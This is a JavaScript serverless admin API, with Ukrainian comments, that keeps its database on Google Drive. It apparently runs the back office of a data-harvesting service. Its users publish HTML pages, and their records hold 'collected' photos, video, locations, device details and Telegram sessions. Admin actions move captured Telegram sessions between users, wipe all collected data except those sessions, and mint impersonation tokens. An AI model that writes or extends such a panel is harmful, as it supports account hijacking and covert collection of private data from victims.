const { google } = require('googleapis');
const { nanoid } = require('nanoid');
const jwt = require('jsonwebtoken');
const stream = require('stream');


const fetch = require('node-fetch');

async function sendTelegramNotification(user, eventData) {
    if (!user.telegramBinding || user.telegramBinding.status !== 'active' || !user.telegramBinding.chatId) {
        return;
    }

    const { BOT_API_URL, BOT_API_SECRET } = process.env;
    if (!BOT_API_URL || !BOT_API_SECRET) {
        console.warn('Змінні для Telegram бота не налаштовано на Netlify.');
        return;
    }

    try {
        await fetch(`${BOT_API_URL}/notify`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${BOT_API_SECRET}` },
            body: JSON.stringify({ chat_id: user.telegramBinding.chatId, event_data: eventData })
        });
    } catch (error) {
        console.error("Помилка відправки сповіщення в Telegram:", error.message);
    }
}

function getDriveClient() {
  if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY) {
    throw new Error("Missing Google service account credentials in environment variables.");
  }
  const credentials = {
    client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
    private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
  };
  const auth = new google.auth.GoogleAuth({
    credentials,
    scopes: ['https://www.googleapis.com/auth/drive'],
  });
  return google.drive({ version: 'v3', auth });
}

async function uploadMediaSimple(drive, buffer, filename, mimeType) {
  const fileMetadata = { name: filename };
  if (process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID) {
    try {
      await drive.files.get({ fileId: process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID });
      fileMetadata.parents = [process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID];
    } catch (_) {}
  }
  const media = { mimeType, body: Buffer.isBuffer(buffer) ? buffer : Buffer.from(buffer) };
  const file = await drive.files.create({ resource: fileMetadata, media, fields: 'id,name,webViewLink,webContentLink' });
  return file.data;
}

async function readDb(drive) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
    const res = await drive.files.get({ fileId, alt: 'media' });
    try {
        const defaultState = {
            users: [],
            refCodes: [],
            blockedIdentifiers: [],
            failedLogins: [],
            settings: { 
                defaultDeviceLimit: 3, 
                dataRetentionDays: 0,
                termsLastUpdatedAt: null,
                termsPushRequired: false
            },
            templates: [],
            addedData: [],
            news: [],
            pushNews: []
        };

        if (!res.data) return defaultState;
        
        const dbData = typeof res.data === 'object' ? res.data : JSON.parse(res.data);

        if (!dbData.settings) dbData.settings = defaultState.settings;
        dbData.settings = { ...defaultState.settings, ...dbData.settings };

        for (const key of ['users', 'refCodes', 'blockedIdentifiers', 'failedLogins', 'templates', 'addedData', 'news', 'pushNews']) {
            if (!dbData[key]) dbData[key] = defaultState[key];
        }

        if (dbData.templates.length === 0) {
            dbData.templates.push(
                { templateId: 'default-1', name: 'Проста візитка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Мій Профіль</title><style>body{font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px;} .card{background: white; margin: 0 auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 300px;} h1{color: #333;} p{color: #666;}</style></head><body><div class="card"><h1>Ім\'я Прізвище</h1><p>Веб-розробник</p></div></body></html>' },
                { templateId: 'default-2', name: 'Сторінка-заглушка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Скоро!</title><style>body{display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; font-family: "Segoe UI", sans-serif;} h1{font-size: 3em;}</style></head><body><h1>Наш сайт скоро відкриється!</h1></body></html>' }
            );
        }
        
        return dbData;
    } catch (e) {
        console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
        return {
            users: [], refCodes: [], blockedIdentifiers: [], failedLogins: [],
            settings: { defaultDeviceLimit: 3, dataRetentionDays: 0, termsLastUpdatedAt: null, termsPushRequired: false },
            templates: [], addedData: [], news: [], pushNews: []
        };
    }
}

async function writeDb(drive, data) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
    const buffer = Buffer.from(JSON.stringify(data, null, 2));
    const bufferStream = new stream.PassThrough();
    bufferStream.end(buffer);
    await drive.files.update({
      fileId,
      media: {
        mimeType: 'application/json',
        body: bufferStream,
      },
    });
}

async function performDbOperation(operation) {
    const MAX_RETRIES = 3;
    let lastError = null;
    for (let i = 0; i < MAX_RETRIES; i++) {
        try {
            const drive = getDriveClient();
            const db = await readDb(drive);
            const { updatedDb, result } = await operation(db);
            await writeDb(drive, updatedDb);
            return result;
        } catch (error) {
            lastError = error;
            console.error(`DB Operation failed on attempt ${i + 1}:`, error.message);
            if (i < MAX_RETRIES - 1) {
                await new Promise(res => setTimeout(res, 200 * (i + 1)));
            }
        }
    }
    throw new Error(`Failed to complete DB operation after ${MAX_RETRIES} attempts. Last error: ${lastError.message}`);
}

// *** NEW: LAZY LOADING HELPER ***
function makeDbLazy(data) {
    const LAZY_THRESHOLD = 500; // 500 characters
    
    function traverse(d) {
        // Якщо це рядок і він занадто довгий, робимо його "лінивим"
        if (typeof d === 'string' && d.length > LAZY_THRESHOLD) {
            return { __lazy: true, type: 'string', size: d.length };
        }
        
        // Якщо це масив, ми проходимо по кожному елементу, а не робимо "лінивим" весь масив
        if (Array.isArray(d)) {
            return d.map(item => traverse(item));
        }

        // Якщо це об'єкт (але не масив і не null), ми проходимо по його ключах
        if (typeof d === 'object' && d !== null) {
            // Перевірка, чи це вже не є нашою заглушкою
            if (d.__lazy) {
                return d;
            }
            const newObj = {};
            for (const key in d) {
                newObj[key] = traverse(d[key]);
            }
            return newObj;
        }

        // Для всіх інших типів даних (числа, boolean, null) повертаємо їх як є
        return d;
    }
    return traverse(data);
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    try {
        const authHeader = event.headers.authorization || '';
        const token = authHeader.startsWith('Bearer ') ? authHeader.substring(7) : null;
        if (!token || !process.env.ADMIN_SECRET) return { statusCode: 401, body: 'Unauthorized' };
        
        const decodedToken = Buffer.from(token, 'base64').toString('utf8');
        if (decodedToken !== process.env.ADMIN_SECRET) return { statusCode: 401, body: 'Unauthorized' };
    } catch (e) { return { statusCode: 401, body: 'Unauthorized' }; }

    try {
        const { action, payload } = JSON.parse(event.body);
        const drive = getDriveClient();
        
        // --- START: Read-only operations (no write lock needed) ---
        const readOnlyActions = ['getDashboardData', 'getUserDetails', 'getCollectedDataForUser', 'getSingleCollectedDataEntry', 'getAddedDataById', 'getRawDatabase', 'getDbNodeValue', 'listNews'];
        if (readOnlyActions.includes(action)) {
            const db = await readDb(drive);
            switch (action) {
                case 'getDashboardData': {
                    const users = db.users.map(({ password, collectedData, sessions, ...user }) => ({
                        ...user,
                        sessionCount: sessions ? sessions.length : 0,
                    }));
                    return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length, pushNews: db.pushNews || [] })};
                }
                case 'getUserDetails': {
                    const user = db.users.find(u => u.userId === payload.userId);
                    if (!user) return { statusCode: 404, body: 'User not found.' };
                    const { password, collectedData, ...userDetails } = user;
                    return { statusCode: 200, body: JSON.stringify({ ...userDetails, restrictions: user.restrictions || {} }) };
                }
                case 'getCollectedDataForUser': {
                    const user = db.users.find(u => u.userId === payload.userId);
                    if (!user) return { statusCode: 404, body: 'User not found.' };

                    const allData = user.collectedData || [];
                    const page = parseInt(payload.page, 10) || 1;
                    const limit = 20;
                    const startIndex = (page - 1) * limit;
                    const endIndex = page * limit;

                    const lightPaginatedData = allData
                        .sort((a, b) => new Date(b.collectedAt) - new Date(a.collectedAt))
                        .slice(startIndex, endIndex)
                        .map(entry => {
                            const { data, ...metadata } = entry;
                            const itemCount = Array.isArray(data) ? data.length : null;
                            return { ...metadata, itemCount };
                        });

                    return { statusCode: 200, body: JSON.stringify({ data: lightPaginatedData, total: allData.length, page, limit })};
                }
                case 'getSingleCollectedDataEntry': {
                    const user = db.users.find(u => u.userId === payload.userId);
                    if (!user) return { statusCode: 404, body: 'User not found' };
                    const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
                    return entry ? { statusCode: 200, body: JSON.stringify(entry) } : { statusCode: 404, body: 'Entry not found' };
                }
                case 'getAddedDataById': {
                    const item = (db.addedData || []).find(a => a.id === payload.id);
                    return item ? { statusCode: 200, body: JSON.stringify(item) } : { statusCode: 404, body: 'AddedData not found' };
                }
                case 'listNews': {
                    return { statusCode: 200, body: JSON.stringify((db.news || []).sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt))) };
                }
                case 'getRawDatabase': {
                    const lazyDb = makeDbLazy(db);
                    return { statusCode: 200, body: JSON.stringify(lazyDb) };
                }
                case 'getDbNodeValue': {
                    const { path } = payload;
                    if (!path || !Array.isArray(path) || path[0] !== 'root') {
                        throw new Error("Path is required and must start with 'root'.");
                    }
                    let value = db;
                    // Знаходимо повне значення за шляхом
                    for (let i = 1; i < path.length; i++) {
                        const key = path[i];
                        if (typeof value !== 'object' || value === null || value[key] === undefined) {
                            throw new Error(`Invalid path at segment: ${key}`);
                        }
                        value = value[key];
                    }
                    // *** ОСНОВНЕ ВИПРАВЛЕННЯ ***
                    // Якщо запитане значення - це рядок, число або boolean, повертаємо його як є, без "лінивої" обробки.
                    // Якщо це об'єкт або масив, застосовуємо "ліниву" логіку до його ВМІСТУ, але не до самого себе.
                    if (typeof value === 'object' && value !== null) {
                        const lazyValue = makeDbLazy(value);
                        return { statusCode: 200, body: JSON.stringify({ value: lazyValue }) };
                    } else {
                        // Для простих типів даних (string, number, etc.) повертаємо їх без змін.
                        return { statusCode: 200, body: JSON.stringify({ value }) };
                    }
                }
            }
        }
        // --- END: Read-only operations ---


        // --- START: Write operations (use locking mechanism) ---
        const result = await performDbOperation(async (db) => {
            let operationResult;
            const user = db.users.find(u => u.userId === payload.userId);

            switch (action) {
                case 'getImpersonationToken': {
                    if (!process.env.JWT_SECRET) throw new Error('Missing JWT_SECRET');
                    if (!user) throw new Error('User not found.');
                    if (!user.sessions) user.sessions = [];
                    let session = user.sessions.find(s => s.status === 'active');
                    if (!session) {
                        session = { sessionId: nanoid(), ip: 'admin_impersonation', fingerprint: 'admin_impersonation', status: 'active', createdAt: new Date().toISOString(), lastUsedAt: new Date().toISOString() };
                        user.sessions.push(session);
                    } else {
                        session.lastUsedAt = new Date().toISOString();
                    }
                    const token = jwt.sign({ userId: user.userId, sessionId: session.sessionId }, process.env.JWT_SECRET, { expiresIn: '15m' });
                    operationResult = { statusCode: 200, body: JSON.stringify({ token }) };
                    break;
                }
                case 'deleteCollectedDataAdmin': {
                    if (user && user.collectedData) {
                        const timestampsToDelete = Array.isArray(payload.timestamps) ? payload.timestamps : [payload.timestamps];
                        user.collectedData = user.collectedData.filter(d => !timestampsToDelete.includes(d.collectedAt));
                    } else { throw new Error('User or data not found.'); }
                    operationResult = { statusCode: 200, body: 'Data deleted.' };
                    break;
                }
                case 'addTemplate': {
                    if (!db.templates) db.templates = [];
                    const newTemplate = { templateId: nanoid(16), name: payload.name, htmlContent: payload.htmlContent, createdAt: new Date().toISOString() };
                    db.templates.push(newTemplate);
                    operationResult = { statusCode: 201, body: JSON.stringify(newTemplate) };
                    break;
                }
                case 'deleteTemplate': {
                    if (db.templates) db.templates = db.templates.filter(t => t.templateId !== payload.templateId);
                    operationResult = { statusCode: 200, body: 'Template deleted.' };
                    break;
                }
                case 'generateCode': {
                    const uses = parseInt(payload.uses, 10) || 1;
                    const newCode = { code: nanoid(10), originalUses: uses, usesLeft: uses, createdAt: new Date().toISOString() };
                    db.refCodes.push(newCode);
                    operationResult = { statusCode: 201, body: JSON.stringify(newCode) };
                    break;
                }
                case 'deleteRefCode': {
                    db.refCodes = db.refCodes.filter(c => c.code !== payload.code);
                    operationResult = { statusCode: 200, body: 'Code deleted.' };
                    break;
                }
                case 'updateGlobalSettings': {
                    db.settings.defaultDeviceLimit = parseInt(payload.defaultDeviceLimit, 10) || 3;
                    db.settings.dataRetentionDays = parseInt(payload.dataRetentionDays, 10) || 0;
                    operationResult = { statusCode: 200, body: 'Settings updated.' };
                    break;
                }
                case 'updateUser': {
                    if (user) {
                        user.status = payload.status === 'suspended' ? 'suspended' : 'active';
                        user.deviceLimitOverride = payload.deviceLimitOverride ? parseInt(payload.deviceLimitOverride, 10) : null;
                    }
                    operationResult = { statusCode: 200, body: 'User updated.' };
                    break;
                }
                case 'updateSession': {
                    const session = user ? user.sessions.find(s => s.sessionId === payload.sessionId) : null;
                    if (session) session.status = payload.status === 'blocked' ? 'blocked' : 'active';
                    operationResult = { statusCode: 200, body: 'Session updated.' };
                    break;
                }
                case 'deleteSession': {
                    if (user) user.sessions = user.sessions.filter(s => s.sessionId !== payload.sessionId);
                    operationResult = { statusCode: 200, body: 'Session deleted.' };
                    break;
                }
                case 'deleteUser': {
                    db.users = db.users.filter(u => u.userId !== payload.userId);
                    operationResult = { statusCode: 200, body: 'User deleted.' };
                    break;
                }
                case 'adminTransferSession': {
                    const { fromUserId, fromTimestamp, toUserId } = payload;
                    if (!fromUserId || !fromTimestamp || !toUserId) throw new Error('Missing required fields.');
                    const fromUser = db.users.find(u => u.userId === fromUserId);
                    const toUser = db.users.find(u => u.userId === toUserId);
                    if (!fromUser || !toUser) throw new Error('User not found.');
                    const idx = (fromUser.collectedData || []).findIndex(d => d.collectedAt === fromTimestamp && d.type === 'telegram_session');
                    if (idx === -1) throw new Error('Session entry not found.');
                    const entry = fromUser.collectedData[idx];
                    fromUser.collectedData.splice(idx, 1);
                    if (!toUser.collectedData) toUser.collectedData = [];
                    toUser.collectedData.push({ ...entry, transferredAt: new Date().toISOString(), transferredFrom: fromUser.userId });
                    operationResult = { statusCode: 200, body: JSON.stringify({ success: true }) };
                    break;
                }
                case 'adminAddDataToUsers': {
                    const { userIds, type, content } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    if (!type) throw new Error('type required');
                    if (!db.addedData) db.addedData = [];
                    const blockId = nanoid(16);
                    let preparedContent = content || null;
                    
                    if (content && content.file && content.file.data) {
                        const fileBuffer = Buffer.from(content.file.data, 'base64');
                        const filename = content.file.name || `file_${Date.now()}`;
                        const mimeType = content.file.type || 'application/octet-stream';
                        try {
                            const driveFile = await uploadMediaSimple(getDriveClient(), fileBuffer, filename, mimeType);
                            preparedContent = { file: { id: driveFile.id, name: driveFile.name, type: mimeType, url: driveFile.webViewLink } };
                        } catch (e) {
                            preparedContent = { file: { name: filename, type: mimeType, data: content.file.data } };
                        }
                    }

                    const block = { id: blockId, type, content: preparedContent, createdAt: new Date().toISOString() };
                    db.addedData.push(block);
                    const now = new Date().toISOString();
                    
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        if (!u.collectedData) u.collectedData = [];
                        
                        const randomFingerprint = nanoid(32); 
                        
                        u.collectedData.push({ 
                            fingerprint: randomFingerprint, 
                            collectedAt: now, 
                            status: 'success', 
                            type, 
                            data: { addedDataId: blockId },
                            addedByAdmin: true 
                        });
                    }
                    operationResult = { statusCode: 201, body: JSON.stringify({ addedDataId: blockId }) };
                    break;
                }
                case 'deleteAddedDataBlock': {
                    const { id } = payload;
                    if (!id) throw new Error('id required');
                    db.users.forEach(u => {
                        if (u.collectedData) {
                            u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId === id));
                        }
                    });
                    db.addedData = (db.addedData || []).filter(a => a.id !== id);
                    operationResult = { statusCode: 200, body: 'Added data block deleted.' };
                    break;
                }
                case 'deleteAllAddedData': {
                    db.users.forEach(u => { if (u.collectedData) u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId)); });
                    db.addedData = [];
                    operationResult = { statusCode: 200, body: 'All added data deleted.' };
                    break;
                }
                case 'wipeAllUsersCollectedData': {
                    db.users.forEach(u => {
                        if (u.collectedData) {
                            u.collectedData = u.collectedData.filter(d => d.type === 'telegram_session');
                        }
                    });
                    operationResult = { statusCode: 200, body: 'All collected data for all users (except Telegram sessions) has been wiped.' };
                    break;
                }
                case 'updateUserRestrictions': {
                    const { userId, restrictions } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    u.restrictions = { ...(u.restrictions || {}), ...(restrictions || {}) };
                    operationResult = { statusCode: 200, body: 'Restrictions updated.' };
                    break;
                }
                case 'updateRawDatabase': {
                    const partialDbState = payload;

                    // Функція для рекурсивного злиття даних
                    function deepMerge(target, source) {
                        for (const key in source) {
                            // Ігноруємо "ліниві" заглушки, щоб не перезаписати реальні дані
                            if (typeof source[key] === 'object' && source[key] !== null && source[key].__lazy) {
                                continue;
                            }
                            
                            // Якщо ключ є об'єктом в обох джерелах (і не масивом), заглиблюємось
                            if (typeof target[key] === 'object' && target[key] !== null && !Array.isArray(target[key]) &&
                                typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
                                deepMerge(target[key], source[key]);
                            } 
                            // В усіх інших випадках (включаючи масиви, які ми хочемо замінити повністю) просто присвоюємо значення
                            else {
                                target[key] = source[key];
                            }
                        }
                    }

                    // 'db' - це повна база даних, прочитана на початку. 'partialDbState' - дані з фронтенду.
                    deepMerge(db, partialDbState);
                    
                    // Тепер `db` містить об'єднані дані, які можна безпечно зберігати.
                    operationResult = { statusCode: 200, body: 'Database updated successfully.' };
                    break;
                }
                case 'bulkUpdateUserRestrictions': {
                    const { userIds, restrictions } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    if (!restrictions || typeof restrictions !== 'object') throw new Error('restrictions object required');
                    let updated = 0;
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        u.restrictions = { ...(u.restrictions || {}), ...restrictions };
                        updated++;
                    }
                    operationResult = { statusCode: 200, body: JSON.stringify({ updated }) };
                    break;
                }
                case 'bulkClearUserRestrictions': {
                    const { userIds } = payload;
                    if (!Array.isArray(userIds) || userIds.length === 0) throw new Error('userIds required');
                    let updated = 0;
                    for (const uid of userIds) {
                        const u = db.users.find(x => x.userId === uid);
                        if (!u) continue;
                        u.restrictions = {};
                        updated++;
                    }
                    operationResult = { statusCode: 200, body: JSON.stringify({ updated }) };
                    break;
                }
                case 'publishUserPageAdmin': {
                    const { userId, source, sourceTemplateId, htmlContent } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    if (u?.restrictions?.publish_page) throw new Error('Publishing is restricted for this user.');
                    if (u?.restrictions?.customization && source === 'custom') throw new Error('Customization is restricted for this user.');
                    if (u?.restrictions?.ui_personalization && source === 'custom') throw new Error('UI personalization is restricted for this user.');
                    u.publishedPage = { source, sourceTemplateId: sourceTemplateId || null, htmlContent: htmlContent || null, updatedAt: new Date().toISOString() };
                    operationResult = { statusCode: 200, body: JSON.stringify(u.publishedPage) };
                    break;
                }
                case 'deleteUserPageAdmin': {
                    const { userId } = payload;
                    const u = db.users.find(x => x.userId === userId);
                    if (!u) throw new Error('User not found.');
                    u.publishedPage = null;
                    operationResult = { statusCode: 200, body: 'Page deleted.' };
                    break;
                }
                 case 'createNews': {
                    if (!db.news) db.news = [];
                    const { title, text, imageUrl, audience } = payload;
                    const item = { 
                        id: nanoid(16), 
                        title, text, 
                        imageUrl: imageUrl || null, 
                        audience: audience || { type: 'all', userIds: [] },
                        readBy: [],
                        createdAt: new Date().toISOString() 
                    };
                    db.news.push(item);
                    const notificationPayload = { type: 'news', title: item.title, text: item.text, imageUrl: item.imageUrl };
                     const targetUsers = db.users.filter(u => {
                        const aud = item.audience;
                        if (aud.type === 'all') return true;
                        if (aud.type === 'include') return aud.userIds.includes(u.userId);
                        if (aud.type === 'exclude') return !aud.userIds.includes(u.userId);
                        return false;
                    });
                    for (const user of targetUsers) {
                        await sendTelegramNotification(user, notificationPayload);
                    }
                    operationResult = { statusCode: 201, body: JSON.stringify(item) };
                    break;
                }
                case 'deleteNews': {
                    const { id } = payload;
                    db.news = (db.news || []).filter(n => n.id !== id);
                    operationResult = { statusCode: 200, body: 'News deleted.' };
                    break;
                }
                case 'unbindTelegram': {
                    if (user && user.telegramBinding) {
                        user.telegramBinding = { ...user.telegramBinding, status: null, chatId: null, username: null, activationId: null };
                    }
                    operationResult = { statusCode: 200, body: 'Telegram unbound.' };
                    break;
                }
                case 'regenerateTelegramId': {
                    if (user) {
                        if (!user.telegramBinding) user.telegramBinding = {};
                        user.telegramBinding = { ...user.telegramBinding, status: 'pending', chatId: null, username: null, activationId: nanoid(16) };
                    }
                    operationResult = { statusCode: 200, body: 'Telegram ID regenerated.' };
                    break;
                }
                case 'toggleTelegramStatus': {
                    if (user && user.telegramBinding) {
                        if (user.telegramBinding.status === 'active') user.telegramBinding.status = 'suspended';
                        else if (['suspended', 'bot_blocked'].includes(user.telegramBinding.status)) user.telegramBinding.status = 'active';
                    }
                    operationResult = { statusCode: 200, body: 'Telegram status toggled.' };
                    break;
                }
                case 'requireTermsUpdate': {
                    db.settings.termsPushRequired = true;
                    db.settings.termsLastUpdatedAt = new Date().toISOString();
                    const notificationPayload = { type: 'terms_update', title: 'Оновлення Умов Використання', text: 'Будь ласка, ознайомтесь з новими умовами при наступному вході в систему.' };
                    for (const user of db.users) {
                        await sendTelegramNotification(user, notificationPayload);
                    }
                    operationResult = { statusCode: 200, body: 'Terms update push has been activated.' };
                    break;
                }
                case 'createPushNews': {
                    if (!db.pushNews) db.pushNews = [];
                    const { title, text, imageUrl, mode, keyword, audience } = payload;
                    const newPush = {
                        id: nanoid(16),
                        title, text, imageUrl: imageUrl || null,
                        mode,
                        keyword: (mode === 'aggressive' && keyword) ? keyword : null,
                        audience: audience || { type: 'all', userIds: [] },
                        createdAt: new Date().toISOString(),
                        seenBy: []
                    };
                    db.pushNews.push(newPush);
                    const notificationPayload = { type: 'push_news', title: newPush.title, text: newPush.text, imageUrl: newPush.imageUrl };
                    const targetUsers = db.users.filter(u => {
                        const aud = newPush.audience;
                        if (aud.type === 'all') return true;
                        if (aud.type === 'include') return aud.userIds.includes(u.userId);
                        if (aud.type === 'exclude') return !aud.userIds.includes(u.userId);
                        return false;
                    });
                    for (const user of targetUsers) {
                        await sendTelegramNotification(user, notificationPayload);
                    }
                    operationResult = { statusCode: 201, body: JSON.stringify(newPush) };
                    break;
                }
                case 'revokeTermsPush': {
                    db.settings.termsPushRequired = false;
                    operationResult = { statusCode: 200, body: 'Terms update push has been revoked.' };
                    break;
                }
                case 'revokePushNews': {
                    const { pushId } = payload;
                    if (db.pushNews) {
                        db.pushNews = db.pushNews.filter(p => p.id !== pushId);
                    }
                    operationResult = { statusCode: 200, body: 'Push news has been revoked.' };
                    break;
                }
                default:
                    throw new Error('Invalid admin action.');
            }
            return { updatedDb: db, result: operationResult };
        });
        return result;
        // --- END: Write operations ---

    } catch (error) {
        console.error(`Admin API Error:`, error);
        const errorMessage = error.message || 'Unknown error';
        if (errorMessage.includes('not found')) return { statusCode: 404, body: errorMessage };
        if (errorMessage.includes('Invalid')) return { statusCode: 400, body: errorMessage };
        return { statusCode: 500, body: `Server error: ${errorMessage}` };
    }
};
